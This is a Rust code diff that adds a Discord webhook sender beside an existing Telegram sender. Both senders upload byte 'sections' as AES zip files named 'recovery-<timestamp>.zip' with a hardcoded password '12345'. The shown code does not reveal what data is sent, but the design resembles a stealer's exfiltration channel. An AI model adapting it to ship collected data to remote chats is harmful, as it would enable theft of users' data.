@@ -1,4 +1,4 @@
-use crate::formatter::{FormattedMessage, MessageFormatter, ParseMode};
+use crate::formatter::{FormattedMessage, MessageFormatter};
 use reqwest::{
     Client,
     multipart::{Form, Part},
@@ -10,11 +10,53 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use thiserror::Error;
 use zip::AesMode;
 use zip::CompressionMethod;
-use zip::write::FileOptions;
-use zip::write::ZipWriter;
+use zip::write::{SimpleFileOptions, ZipWriter};
 
 const TELEGRAM_FILE_SIZE_LIMIT: usize = 20 * 1024 * 1024;
+const DISCORD_FILE_SIZE_LIMIT: usize = 8 * 1024 * 1024;
 const DEFAULT_ARCHIVE_PASSWORD: &str = "12345";
+
+pub const TELEGRAM_MESSAGE_LIMIT: usize = 4096;
+pub const DISCORD_MESSAGE_LIMIT: usize = 2000;
+
+#[derive(Debug, Clone)]
+pub enum Sender {
+    Telegram(TelegramSender, ChatId),
+    Discord(DiscordSender),
+}
+
+impl Sender {
+    pub fn max_message_length(&self) -> usize {
+        match self {
+            Sender::Telegram(..) => TELEGRAM_MESSAGE_LIMIT,
+            Sender::Discord(_) => DISCORD_MESSAGE_LIMIT,
+        }
+    }
+
+    pub async fn send_formatted_message<I, S>(
+        &self,
+        formatter: &MessageFormatter,
+        parts: I,
+        sections: Option<&[(String, Vec<u8>)]>,
+    ) -> Result<(), SenderError>
+    where
+        I: IntoIterator<Item = S>,
+        S: AsRef<str>,
+    {
+        match self {
+            Sender::Telegram(sender, chat_id) => {
+                sender
+                    .send_formatted_message(chat_id.clone(), formatter, parts, sections)
+                    .await
+            }
+            Sender::Discord(sender) => {
+                sender
+                    .send_formatted_message(formatter, parts, sections)
+                    .await
+            }
+        }
+    }
+}
 
 #[derive(Debug, Clone)]
 pub struct TelegramSender {
@@ -40,19 +82,16 @@ impl TelegramSender {
         chat_id: ChatId,
         formatter: &MessageFormatter,
         parts: I,
-        sections: Option<&[(String, String)]>,
-    ) -> Result<(), TelegramSenderError>
+        sections: Option<&[(String, Vec<u8>)]>,
+    ) -> Result<(), SenderError>
     where
         I: IntoIterator<Item = S>,
         S: AsRef<str>,
     {
         let formatted = formatter.format(parts);
         let FormattedMessage { text, .. } = formatted;
-        let mut options = SendMessageOptions::default();
-        options.parse_mode = formatter.parse_mode();
-
         if !text.is_empty() {
-            self.send_message_with_options(chat_id.clone(), text, options)
+            self.send_message_with_options(chat_id.clone(), text, SendMessageOptions::default())
                 .await?;
         }
         if let Some(sections) = sections {
@@ -65,8 +104,8 @@ impl TelegramSender {
     async fn send_sections_as_zip(
         &self,
         chat_id: ChatId,
-        sections: &[(String, String)],
-    ) -> Result<(), TelegramSenderError> {
+        sections: &[(String, Vec<u8>)],
+    ) -> Result<(), SenderError> {
         if sections.is_empty() {
             return Ok(());
         }
@@ -85,7 +124,7 @@ impl TelegramSender {
                 .await
             {
                 Ok(()) => continue,
-                Err(err @ TelegramSenderError::FileTooLarge { .. }) => {
+                Err(err @ SenderError::FileTooLarge { .. }) => {
                     if chunk.len() == 1 {
                         return Err(err);
                     }
@@ -104,11 +143,10 @@ impl TelegramSender {
         chat_id: ChatId,
         text: impl Into<String>,
         options: SendMessageOptions,
-    ) -> Result<(), TelegramSenderError> {
+    ) -> Result<(), SenderError> {
         let payload = SendMessagePayload {
             chat_id,
             text: text.into(),
-            parse_mode: options.parse_mode,
             disable_web_page_preview: options.disable_web_page_preview,
             disable_notification: options.disable_notification,
         };
@@ -120,7 +158,7 @@ impl TelegramSender {
         if body.ok {
             Ok(())
         } else {
-            Err(TelegramSenderError::Api(
+            Err(SenderError::Api(
                 body.description
                     .unwrap_or_else(|| "telegram api request failed".into()),
             ))
@@ -132,10 +170,10 @@ impl TelegramSender {
         chat_id: ChatId,
         file_name: impl Into<String>,
         content: Vec<u8>,
-    ) -> Result<(), TelegramSenderError> {
+    ) -> Result<(), SenderError> {
         let file_name = file_name.into();
         if content.len() > TELEGRAM_FILE_SIZE_LIMIT {
-            return Err(TelegramSenderError::FileTooLarge {
+            return Err(SenderError::FileTooLarge {
                 file_name,
                 size: content.len(),
             });
@@ -151,10 +189,138 @@ impl TelegramSender {
         if body.ok {
             Ok(())
         } else {
-            Err(TelegramSenderError::Api(
+            Err(SenderError::Api(
                 body.description
                     .unwrap_or_else(|| "telegram api request failed".into()),
             ))
+        }
+    }
+}
+
+#[derive(Debug, Clone)]
+pub struct DiscordSender {
+    client: Client,
+    webhook_url: String,
+}
+
+impl DiscordSender {
+    pub fn new(webhook_url: impl Into<String>) -> Self {
+        Self {
+            client: Client::new(),
+            webhook_url: webhook_url.into(),
+        }
+    }
+
+    pub async fn send_formatted_message<I, S>(
+        &self,
+        formatter: &MessageFormatter,
+        parts: I,
+        sections: Option<&[(String, Vec<u8>)]>,
+    ) -> Result<(), SenderError>
+    where
+        I: IntoIterator<Item = S>,
+        S: AsRef<str>,
+    {
+        let formatted = formatter.format(parts);
+        let FormattedMessage { text, .. } = formatted;
+
+        if !text.is_empty() {
+            self.send_message(text).await?;
+        }
+        if let Some(sections) = sections {
+            self.send_sections_as_zip(sections).await?;
+        }
+
+        Ok(())
+    }
+
+    async fn send_sections_as_zip(
+        &self,
+        sections: &[(String, Vec<u8>)],
+    ) -> Result<(), SenderError> {
+        if sections.is_empty() {
+            return Ok(());
+        }
+
+        let mut stack = vec![sections];
+        while let Some(chunk) = stack.pop() {
+            if chunk.is_empty() {
+                continue;
+            }
+
+            let password = archive_password();
+            let archive = build_zip_archive(chunk, &password)?;
+            let file_name = format!("recovery-{}.zip", current_timestamp());
+            match self.send_document(file_name, archive).await {
+                Ok(()) => continue,
+                Err(err @ SenderError::FileTooLarge { .. }) => {
+                    if chunk.len() == 1 {
+                        return Err(err);
+                    }
+                    let mid = chunk.len() / 2;
+                    stack.push(&chunk[mid..]);
+                    stack.push(&chunk[..mid]);
+                }
+                Err(err) => return Err(err),
+            }
+        }
+        Ok(())
+    }
+
+    pub async fn send_message(&self, text: impl Into<String>) -> Result<(), SenderError> {
+        let payload = serde_json::json!({
+            "content": text.into(),
+        });
+
+        let response = self
+            .client
+            .post(&self.webhook_url)
+            .json(&payload)
+            .send()
+            .await?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(SenderError::Api(format!(
+                "discord api request failed: {}",
+                response.status()
+            )))
+        }
+    }
+
+    pub async fn send_document(
+        &self,
+        file_name: impl Into<String>,
+        content: Vec<u8>,
+    ) -> Result<(), SenderError> {
+        let file_name = file_name.into();
+        if content.len() > DISCORD_FILE_SIZE_LIMIT {
+            return Err(SenderError::FileTooLarge {
+                file_name,
+                size: content.len(),
+            });
+        }
+
+        let form = Form::new().part(
+            "file",
+            Part::bytes(content).file_name(file_name.clone()),
+        );
+
+        let response = self
+            .client
+            .post(&self.webhook_url)
+            .multipart(form)
+            .send()
+            .await?;
+
+        if response.status().is_success() {
+            Ok(())
+        } else {
+            Err(SenderError::Api(format!(
+                "discord api request failed: {}",
+                response.status()
+            )))
         }
     }
 }
@@ -195,7 +361,6 @@ impl<'a> From<&'a str> for ChatId {
 
 #[derive(Debug, Clone)]
 pub struct SendMessageOptions {
-    pub parse_mode: Option<ParseMode>,
     pub disable_web_page_preview: bool,
     pub disable_notification: bool,
 }
@@ -203,7 +368,6 @@ pub struct SendMessageOptions {
 impl Default for SendMessageOptions {
     fn default() -> Self {
         Self {
-            parse_mode: None,
             disable_web_page_preview: true,
             disable_notification: false,
         }
@@ -214,7 +378,6 @@ impl Default for SendMessageOptions {
 struct SendMessagePayload {
     chat_id: ChatId,
     text: String,
-    parse_mode: Option<ParseMode>,
     disable_web_page_preview: bool,
     disable_notification: bool,
 }
@@ -226,10 +389,10 @@ struct TelegramApiResponse {
 }
 
 #[derive(Debug, Error)]
-pub enum TelegramSenderError {
+pub enum SenderError {
     #[error("http client error: {0}")]
     Http(#[from] reqwest::Error),
-    #[error("telegram api error: {0}")]
+    #[error("api error: {0}")]
     Api(String),
     #[error("file too large ({size} bytes)")]
     FileTooLarge { file_name: String, size: usize },
@@ -251,17 +414,17 @@ fn current_timestamp() -> u128 {
 }
 
 fn build_zip_archive(
-    sections: &[(String, String)],
+    sections: &[(String, Vec<u8>)],
     password: &str,
-) -> Result<Vec<u8>, TelegramSenderError> {
+) -> Result<Vec<u8>, SenderError> {
     let cursor = Cursor::new(Vec::new());
     let mut zip = ZipWriter::new(cursor);
     for (name, content) in sections {
-        let options = FileOptions::<'static, ()>::default()
+        let options = SimpleFileOptions::default()
             .compression_method(CompressionMethod::Deflated)
             .with_aes_encryption(AesMode::Aes256, password);
         zip.start_file(name, options)?;
-        zip.write_all(content.as_bytes())?;
+        zip.write_all(content)?;
     }
     let cursor = zip.finish()?;
     Ok(cursor.into_inner())
